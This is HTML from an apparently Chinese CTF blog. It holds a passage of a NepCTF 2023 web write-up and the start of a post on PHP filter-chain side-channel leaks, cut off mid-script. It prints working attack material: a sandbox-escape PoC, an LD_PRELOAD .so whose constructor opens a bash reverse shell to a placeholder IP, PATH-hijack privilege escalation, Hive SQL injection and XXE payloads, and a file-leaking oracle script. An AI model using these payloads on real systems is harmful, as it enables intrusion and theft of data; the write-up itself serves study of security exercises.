class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename = <span class="hljs-string">&quot;../../../../flag_mini&quot;</span>;    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">openat</span>(<span class="hljs-number">3</span>, filename, O_CREAT | O_WRONLY);    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-comment">// 处理打开文件失败的情况</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);    &#125;    <span class="hljs-comment">// 更改文件权限为 777</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fchmod</span>(fd, S_IRWXU | S_IRWXG | S_IRWXO) == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-comment">// 处理更改文件权限失败的情况</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);    &#125;    <span class="hljs-comment">// 使用新文件进行操作...</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>注意，由于ctf用户运行是在沙盒里，我们也需要切换过去</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/ctf/sandbox/d41d8cd98f00b204e9800998ecf8427e<span class="hljs-built_in">echo</span> I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpby5oPgoKaW50IG1haW4oKSB7CiAgICBjb25zdCBjaGFyKiBmaWxlbmFtZSA9ICIuLi8uLi8uLi8uLi9mbGFnX21pbmkiOwogICAgaW50IGZkID0gb3BlbmF0KDMsIGZpbGVuYW1lLCBPX0NSRUFUIHwgT19XUk9OTFkpOwogICAgaWYgKGZkID09IC0xKSB7CiAgICAgICAgLy8g5aSE55CG5omT5byA5paH5Lu25aSx6LSl55qE5oOF5Ya1CiAgICAgICAgcHJpbnRmKCIxIik7CiAgICB9CgogICAgLy8g5pu05pS55paH5Lu25p2D6ZmQ5Li6IDc3NwogICAgaWYgKGZjaG1vZChmZCwgU19JUldYVSB8IFNfSVJXWEcgfCBTX0lSV1hPKSA9PSAtMSkgewogICAgICAgIC8vIOWkhOeQhuabtOaUueaWh+S7tuadg+mZkOWksei0peeahOaDheWGtQogICAgICAgIHByaW50ZigiMiIpOwogICAgfQoKICAgIC8vIOS9v+eUqOaWsOaWh+S7tui/m+ihjOaTjeS9nC4uLgoKICAgIHJldHVybiAwOwp9|<span class="hljs-built_in">base64</span> -d &gt; poc.cgcc poc.c -o poc</code></pre></div><p><img src="/2023/08/31/NepCTF2023/web4.png" alt="image.png"></p><p>eth0网卡是172.17.0.19，源码中说了，会判断我们的nc是否和eth0对应的ip一样</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">172.17.0.19</span> <span class="hljs-number">9999</span><span class="hljs-attribute">Tmp</span>-Command:./poc</code></pre></div><p><img src="/2023/08/31/NepCTF2023/web5.png"></p><p>成功修改权限</p><h3 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h3><p>操作一下参数得到源代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$jump_link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;link&#x27;</span>];<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$jump_link</span>)) &#123;    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$jump_link</span>. <span class="hljs-string">&quot;.txt&quot;</span>); <span class="hljs-comment">// More info? See &quot;/var/www/html/hint.ini&quot; or &quot;./hint.ini&quot;</span>    &#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hint&#x27;</span>])) &#123;        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    &#125;<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hint&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$jump_link</span>)) &#123;<span class="hljs-meta">?&gt;</span>所以到底来没来? 且看 /<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)<span class="hljs-meta">?&gt;</span>?hint<span class="hljs-meta">&lt;?php</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>Boogipop大佬说一眼看出<code>filterchain</code>，虽然我在比赛前不久学过filterchain，但根本不知道这里为什么要使用</p><p>这里filterchain的问题是<code>/tmp/resources/2.txt</code>的内容为中文</p><p>要先对其进行<code>base64-encode</code>然后再进行<code>filterchain</code></p><p>接着查看phpinfo()，发现禁了一堆东西</p><p>想用rce读取根目录下的flag，boogipop大佬的方法是劫持LD_PRELOAD</p><div class="code-wrapper"><pre><code class="hljs routeros">POST /jump.php?<span class="hljs-attribute">link</span>=php://filter/.....Host: nepctf.1cepeak.cn:31227Content-Length: 15965Content-Type: multipart/form-data; <span class="hljs-attribute">boundary</span>=----WebKitFormBoundaryTxfOtxyr9SXcCydOConnection: close------WebKitFormBoundaryTxfOtxyr9SXcCydOContent-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;hack.so&quot;</span>Content-Type: application/octet-streamXXXXXXX------WebKitFormBoundaryTxfOtxyr9SXcCydOContent-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;1&quot;</span>var_dump(scandir(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<span class="hljs-variable">$a</span>=scandir(<span class="hljs-string">&quot;glob:///tmp/php*&quot;</span>);<span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/tmp/&quot;</span>.<span class="hljs-variable">$a</span>[0];var_dump(<span class="hljs-variable">$filename</span>);putenv(<span class="hljs-string">&quot;LD_PRELOAD=<span class="hljs-variable">$filename</span>&quot;</span>);mb_send_mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);------WebKitFormBoundaryTxfOtxyr9SXcCydO--Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;submit&quot;</span>submit------WebKitFormBoundaryTxfOtxyr9SXcCydO--</code></pre></div><p>编译c为恶意so文件</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">angel</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 &lt;&amp;1&#x27;&quot;</span>);&#125;</code></pre></div><p>大佬执行的命令很细节，用<strong>glob伪协议</strong>去锁定php产生的临时文件，然后用<code>mb_send_mail</code>触发LD劫持</p><p>最后环境变量提权，有个showmsg文件</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bib/bash&quot;</span>&gt;<span class="hljs-built_in">cat</span><span class="hljs-built_in">chmod</span> 777 <span class="hljs-built_in">cat</span><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><span class="hljs-built_in">cd</span> /./showmsg</code></pre></div><h3 id="Hive-it"><a href="#Hive-it" class="headerlink" title="Hive it"></a>Hive it</h3><p>hive数据库，一看版本是2.3.2.是一个有sql注入漏洞的版本，这个版本jdbc连接hive数据库会造成注入问题</p><p>题目提示token在real_token中，boogipop大佬测出能使用union</p><p><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual">https://cwiki.apache.org/confluence/display/Hive/LanguageManual</a></p><p>real_token大写绕过</p><div class="code-wrapper"><pre><code class="hljs scilab"><span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;1\\&#x27;</span> union all <span class="hljs-keyword">select</span> token from REAL_TOKEN -- <span class="hljs-string">&quot;</span></code></pre></div><p><code>hit_si11y_Drunkbaby</code></p><p>XPATH出过CVE，存在XXE</p><div class="code-wrapper"><pre><code class="hljs xml">SELECT xpath(&#x27;<span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>\n<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [\n\t<span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>\n]&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>&#x27;,&#x27;/root/text()&#x27;);</code></pre></div><h1 id="Rerference"><a href="#Rerference" class="headerlink" title="Rerference"></a>Rerference</h1><p><a href="https://nepnep-team.feishu.cn/wiki/SlmLwUflEisv6EkIkFYc9J4Ennh">https://nepnep-team.feishu.cn/wiki/SlmLwUflEisv6EkIkFYc9J4Ennh</a></p><p>[NepCTF 2023 Web WriteUp - Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/08/14/NepCTF">https://boogipop.com/2023/08/14/NepCTF</a> 2023 All WriteUP&#x2F;)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>从lovephp看侧信道</title>
    <link href="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    <url>/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/</url>
    
    <content type="html"><![CDATA[<h1 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h1><h2 id="什么是侧信道"><a href="#什么是侧信道" class="headerlink" title="什么是侧信道"></a>什么是侧信道</h2><p>个人简单理解就是通过报错，响应时间等信息推断出敏感信息，因此经常通过<strong>盲注</strong>的方式进行攻击</p><p>Boogipop大佬的说法：</p><p>都说侧信道，那什么是侧信道。侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现</p><blockquote><p>盲注攻击在广义上可以被认为是一种侧信道攻击，因为它是利用应用程序的实现细节（如响应时间、错误信息等）推断出敏感信息的一种攻击方式。与其他侧信道攻击不同的是，盲注攻击通常是针对Web应用程序或其他应用程序进行的，而不是直接攻击物理设备或加密算法。<br>在盲注攻击中，攻击者通常无法直接获取目标系统中的敏感信息，而是通过不断地尝试发送恶意数据，并根据应用程序的响应结果进行推断。例如，攻击者可以通过不断地发送不同的请求，根据目标系统返回的响应时间、错误信息等推断出敏感信息，进而实现攻击的目的</p></blockquote><h2 id="DownUnderCTF2022-minimal-php"><a href="#DownUnderCTF2022-minimal-php" class="headerlink" title="[DownUnderCTF2022] minimal-php"></a>[DownUnderCTF2022] minimal-php</h2><p>题目只有一句话</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);</code></pre></div><p>Boogipop大佬说够存一辈子的脚本，嘿嘿</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">THE GRAND IDEA:</span><span class="hljs-string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span><span class="hljs-string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span><span class="hljs-string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span><span class="hljs-string">the string is empty.</span><span class="hljs-string"></span><span class="hljs-string">THE GRAND IDEA 2:</span><span class="hljs-string">The dechunk filter is interesting.</span><span class="hljs-string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span><span class="hljs-string">It looks like it was implemented for something http related, but for our purposes, the interesting</span><span class="hljs-string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span><span class="hljs-string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span><span class="hljs-string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span><span class="hljs-string"></span><span class="hljs-string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span><span class="hljs-string"></span><span class="hljs-string">does not cause a 500 error.</span><span class="hljs-string"></span><span class="hljs-string">THE REST:</span><span class="hljs-string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span><span class="hljs-string">into madness trying to figure out ways to:</span><span class="hljs-string">- somehow get other characters not at the start of the flag file to the front</span><span class="hljs-string">- detect more precisely which character is at the front</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">join</span>(<span class="hljs-params">*x</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;|&#x27;</span>.join(x)<span class="hljs-keyword">def</span> <span class="hljs-title function_">err</span>(<span class="hljs-params">s</span>):<span class="hljs-built_in">print</span>(s)<span class="hljs-keyword">raise</span> ValueError<span class="hljs-keyword">def</span> <span class="hljs-title function_">req</span>(<span class="hljs-params">s</span>):data = &#123;<span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">f&#x27;php://filter/<span class="hljs-subst">&#123;s&#125;</span>/resource=/flag&#x27;</span>&#125;<span class="hljs-keyword">return</span> requests.post(<span class="hljs-string">&#x27;http://localhost:5000/index.php&#x27;</span>, data=data).status_code == <span class="hljs-number">500</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">Step 1:</span><span class="hljs-string">The second step of our exploit only works under two conditions:</span><span class="hljs-string">- String only contains a-zA-Z0-9</span><span class="hljs-string">- String ends with two equals signs</span><span class="hljs-string"></span><span class="hljs-string">base64-encoding the flag file twice takes care of the first condition.</span><span class="hljs-string"></span><span class="hljs-string">We don&#x27;t know the length of the flag file, so we can&#x27;t be sure that it will end with two equals</span><span class="hljs-string">signs.</span><span class="hljs-string"></span><span class="hljs-string">Repeated application of the convert.quoted-printable-encode will only consume additional</span><span class="hljs-string">memory if the base64 ends with equals signs, so that&#x27;s what we are going to use as an oracle here.</span><span class="hljs-string">If the double-base64 does not end with two equals signs, we will add junk data to the start of the</span><span class="hljs-string">flag with convert.iconv..CSISO2022KR until it does.</span><span class="hljs-string">&quot;&quot;&quot;</span>blow_up_enc = join(*[<span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="hljs-number">1000</span>)blow_up_utf32 = <span class="hljs-string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span>blow_up_inf = join(*[blow_up_utf32]*<span class="hljs-number">50</span>)header = <span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><span class="hljs-comment"># Start get baseline blowup</span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calculating blowup&#x27;</span>)baseline_blowup = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):payload = join(*[blow_up_utf32]*n)<span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>):baseline_blowup = n<span class="hljs-keyword">break</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;baseline blowup is <span class="hljs-subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="hljs-number">1</span>))<span class="hljs-keyword">assert</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="hljs-literal">False</span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;detecting equals&#x27;</span>)j = [req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>)]<span class="hljs-built_in">print</span>(j)<span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(j) != <span class="hljs-number">2</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">if</span> j[<span class="hljs-number">0</span>] == <span class="hljs-literal">False</span>:header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span><span class="hljs-keyword">elif</span> j[<span class="hljs-number">1</span>] == <span class="hljs-literal">False</span>:header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span><span class="hljs-keyword">elif</span> j[<span class="hljs-number">2</span>] == <span class="hljs-literal">False</span>:header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;j: <span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;header: <span class="hljs-subst">&#123;header&#125;</span>&#x27;</span>)<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">Step two:</span><span class="hljs-string">Now we have something of the form</span><span class="hljs-string">[a-zA-Z0-9 things]==</span><span class="hljs-string"></span><span class="hljs-string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span><span class="hljs-string">successive characters from the start of the string to access every character. Maybe something like</span><span class="hljs-string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span><span class="hljs-string">there are filters that *swap* characters:</span><span class="hljs-string"></span><span class="hljs-string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span><span class="hljs-string">abcdefgh -&gt; badcfehg</span><span class="hljs-string"></span><span class="hljs-string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span><span class="hljs-string">abcdefgh -&gt; dcbahgfe</span><span class="hljs-string"></span><span class="hljs-string">This allows us to access the first four characters of the string. Can we do better? It turns out</span><span class="hljs-string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span><span class="hljs-string">the string:</span><span class="hljs-string"></span><span class="hljs-string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span><span class="hljs-string"></span><span class="hljs-string">The idea being that if we now use the r4 gadget, we get something like:</span><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span><span class="hljs-string"></span><span class="hljs-string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span><span class="hljs-string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span><span class="hljs-string">bafedc</span><span class="hljs-string"></span><span class="hljs-string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span><span class="hljs-string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span><span class="hljs-string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span><span class="hljs-string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span><span class="hljs-string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span><span class="hljs-string">turns out, if we apply the filter</span><span class="hljs-string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span><span class="hljs-string"></span><span class="hljs-string">It will turn the == into:</span><span class="hljs-string">+---AD0-3D3D+---AD0-3D3D</span><span class="hljs-string"></span><span class="hljs-string">And this is magic, because this corrects such that when we apply the</span><span class="hljs-string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span><span class="hljs-string"></span><span class="hljs-string">Let&#x27;s recap. We have a string like:</span><span class="hljs-string">abcdefghij==</span><span class="hljs-string"></span><span class="hljs-string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span><span class="hljs-string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span><span class="hljs-string"></span><span class="hljs-string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span><span class="hljs-string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span><span class="hljs-string"></span><span class="hljs-string">Apply r4 gadget:</span><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span><span class="hljs-string"></span><span class="hljs-string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span><span class="hljs-string">bafedcjihg+0DAD3D3+0DAD3Dw==</span><span class="hljs-string"></span><span class="hljs-string">Then apply r4 once more:</span><span class="hljs-string">efabijcd0+gh3DAD0+3D3DAD==wD</span><span class="hljs-string"></span><span class="hljs-string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span><span class="hljs-string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span><span class="hljs-string">want, to access all the characters in the string ;)</span><span class="hljs-string">&quot;&quot;&quot;</span>flip = <span class="hljs-string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span>r2 = <span class="hljs-string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span>r4 = <span class="hljs-string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_nth</span>(<span class="hljs-params">n</span>):<span class="hljs-keyword">global</span> flip, r2, r4o = []chunk = n // <span class="hljs-number">2</span><span class="hljs-keyword">if</span> chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>: o.append(r4)o.extend([flip, r4] * (chunk // <span class="hljs-number">2</span>))<span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) ^ (chunk % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): o.append(r2)<span class="hljs-keyword">return</span> join(*o)<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">Step 3:</span><span class="hljs-string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span><span class="hljs-string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span><span class="hljs-string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span><span class="hljs-string">I just bruteforced every combination of iconv filters to find these.</span><span class="hljs-string"></span><span class="hljs-string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span><span class="hljs-string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually </span><span class="hljs-string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span><span class="hljs-string">string to figure out which number it is.</span><span class="hljs-string">&quot;&quot;&quot;</span>rot1 = <span class="hljs-string">&#x27;convert.iconv.437.CP930&#x27;</span>be = <span class="hljs-string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span>o = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_letter</span>(<span class="hljs-params">prefix</span>):<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># a-f A-F 0-9</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># a-e</span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;edcba&#x27;</span>[n]<span class="hljs-keyword">break</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># A-E</span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;EDCBA&#x27;</span>[n]<span class="hljs-keyword">break</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># f</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;f&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># F</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;F&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span 